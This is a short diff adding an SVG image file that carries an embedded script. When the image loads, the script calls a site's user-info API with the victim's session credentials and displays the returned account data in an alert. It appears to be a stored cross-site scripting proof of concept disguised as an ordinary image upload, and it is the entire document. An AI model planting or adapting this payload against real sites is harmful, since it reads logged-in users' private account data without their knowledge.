@@ -1,0 +1,13 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    fetch('/gw-api/user-center/user-info', {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'X-Bm-Client': 'WEB'
+      }
+    })
+    .then(r => r.text())
+    .then(d => alert(d));
+  ]]></script>
+</svg>
